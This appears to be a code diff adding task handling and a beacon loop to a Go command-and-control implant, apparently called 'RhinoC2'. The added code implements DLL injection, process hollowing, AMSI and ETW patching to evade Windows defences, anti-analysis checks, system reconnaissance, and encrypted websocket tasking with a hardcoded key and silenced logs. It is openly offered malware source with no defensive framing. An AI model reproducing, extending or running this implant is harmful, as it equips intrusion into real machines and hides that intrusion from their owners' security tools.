@@ -1,4 +1,4 @@
-﻿package main
+package main
 
 import (
 	"encoding/json"
@@ -318,3 +318,135 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 				result = fmt.Sprintf("DLL injection failed: %v", err)
 			} else {
 				result = fmt.Sprintf("DLL injected into PID %d", pid)
+			}
+		} else {
+			result = "usage: inject_dll <pid>:<dll_path>"
+		}
+
+	case "hollow_process":
+		parts := strings.Split(args, ":")
+		if len(parts) == 2 {
+			payload := []byte(parts[1])
+			err := a.evasion.ProcessHollowing(parts[0], payload)
+			if err != nil {
+				result = "process hollowing failed: " + err.Error()
+			} else {
+				result = "process hollowing completed"
+			}
+		} else {
+			result = "usage: hollow_process <target_exe>:<payload_hex>"
+		}
+
+	case "patch_amsi":
+		err := a.evasion.DisableAMSI()
+		if err != nil {
+			result = err.Error()
+		} else {
+			result = "AMSI patched successfully"
+		}
+
+	case "patch_etw":
+		err := a.evasion.PatchETW()
+		if err != nil {
+			result = "ETW patch failed: " + err.Error()
+		} else {
+			result = "ETW patched successfully"
+		}
+
+	case "sysinfo":
+		info := commands.GetSystemInfo()
+		data, _ := json.Marshal(info)
+		result = string(data)
+
+	case "sleep":
+		var interval int
+		fmt.Sscanf(args, "%d", &interval)
+		a.config.Interval = time.Duration(interval) * time.Second
+		result = fmt.Sprintf("sleep interval set to %d seconds", interval)
+
+	case "exit":
+		result = "agent exiting"
+		response := map[string]interface{}{
+			"task_id": taskID,
+			"result":  result,
+		}
+		data, _ := json.Marshal(response)
+		encrypted, _ := a.crypto.Encrypt(data)
+		a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
+		os.Exit(0)
+
+	default:
+		result = "unknown command"
+	}
+
+	response := map[string]interface{}{
+		"task_id": taskID,
+		"result":  result,
+	}
+
+	data, _ := json.Marshal(response)
+	encrypted, _ := a.crypto.Encrypt(data)
+	a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
+}
+
+func (a *Agent) run() {
+	if err := a.evasion.AntiAnalysis(); err != nil {
+		return
+	}
+
+	for {
+		conn, _, err := websocket.DefaultDialer.Dial(a.config.ServerURL, nil)
+		if err != nil {
+			time.Sleep(a.config.Interval)
+			continue
+		}
+
+		a.conn = conn
+		if err := a.checkin(); err != nil {
+			conn.Close()
+			time.Sleep(a.config.Interval)
+			continue
+		}
+
+		for {
+			_, msg, err := conn.ReadMessage()
+			if err != nil {
+				break
+			}
+
+			decrypted, err := a.crypto.Decrypt(string(msg))
+			if err != nil {
+				continue
+			}
+
+			var task map[string]interface{}
+			if err := json.Unmarshal(decrypted, &task); err != nil {
+				continue
+			}
+
+			go a.handleTask(task)
+
+			heartbeat := map[string]string{"status": "alive"}
+			data, _ := json.Marshal(heartbeat)
+			encrypted, _ := a.crypto.Encrypt(data)
+			conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
+		}
+
+		conn.Close()
+		time.Sleep(a.config.Interval)
+	}
+}
+
+func main() {
+	serverURL := "ws://localhost:8443/api/agent"
+	key := "RhinoC2SecretKey2024"
+
+	agent := newAgent(Config{
+		ServerURL: serverURL,
+		Key:       key,
+		Interval:  5 * time.Second,
+	})
+
+	log.SetOutput(io.Discard)
+	agent.run()
+}
